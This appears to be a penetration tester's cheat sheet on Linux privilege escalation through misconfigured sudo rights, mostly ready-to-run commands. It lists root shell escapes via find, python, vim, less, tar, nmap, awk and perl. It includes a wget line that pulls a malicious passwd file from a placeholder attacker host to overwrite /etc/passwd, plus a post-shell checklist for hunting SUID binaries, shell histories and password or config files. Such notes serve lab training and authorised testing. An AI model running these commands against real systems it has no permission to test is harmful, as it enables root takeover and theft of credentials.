# Privilege Escalation — sudo -l

**Always run this immediately after getting a shell. No exceptions.**

```bash
sudo -l
```

---

## Reading the Output

```
User jboss may run the following commands:
    (ALL) NOPASSWD: /usr/bin/find
```

| Part | Meaning |
|---|---|
| `(ALL)` | Can run as ANY user including root |
| `(www-data)` | Can only run as www-data — less useful |
| `NOPASSWD:` | No password needed — easiest path |
| `/usr/bin/find` | The binary you can abuse |

**Three questions immediately:**
1. What binary is it? → Search GTFOBins
2. Is it (ALL)? → Can become root
3. Is it NOPASSWD? → Don't even need a password

---

## GTFOBins

**URL:** gtfobins.github.io  
**Bookmark this. Use it every engagement.**

Search the binary name → click Sudo section → copy the command.

---

## Common Sudo Misconfigurations to Memorize

### find
```bash
sudo find . -exec /bin/bash \; -quit
```
Why: `-exec` runs commands with find's privileges (root)

### python / python3
```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```
Why: Can import os and spawn shell directly

### vim / nano
```bash
# In vim — type this in command mode
sudo vim -c ':!/bin/bash'
```
Why: Editors can execute shell commands

### bash
```bash
sudo bash
```
Why: Obvious

### less / more
```bash
sudo less /etc/passwd
# Then type: !/bin/bash
```
Why: Pager programs can execute shell commands

### wget
```bash
# Overwrite /etc/passwd or sudoers
sudo wget http://ATTACKER/malicious_passwd -O /etc/passwd
```
Why: Can write to any file as root

### tar
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```
Why: Checkpoint action executes commands

### nmap (older versions)
```bash
sudo nmap --interactive
# Then type: !sh
```
Why: Interactive mode spawns shell

### awk
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```
Why: Can execute system commands

### perl
```bash
sudo perl -e 'exec "/bin/bash"'
```
Why: Can execute system calls directly

---

## The Mental Model

Any binary that can:
- Execute other programs → directly spawn a shell
- Spawn a subshell → escape into bash
- Write files → overwrite /etc/passwd or sudoers

...is a potential root escalation when running via sudo.

---

## Quick Checklist After Getting a Shell

```bash
# 1. Who am I?
whoami
id

# 2. What can I sudo?
sudo -l

# 3. What SUID binaries exist?
find / -perm -u=s -type f 2>/dev/null

# 4. What's in home directories?
ls -la /home/
cat /home/*/.*history 2>/dev/null

# 5. Any interesting files?
find / -name "*.txt" 2>/dev/null | grep -v proc
find / -name "*password*" 2>/dev/null
find / -name "*config*" 2>/dev/null

# 6. Cron jobs?
cat /etc/crontab
ls -la /etc/cron*

# 7. Writable directories?
find / -writable -type d 2>/dev/null
```

---

## Reference

- GTFOBins: gtfobins.github.io
- Linux PrivEsc room on THM covers all of these in depth
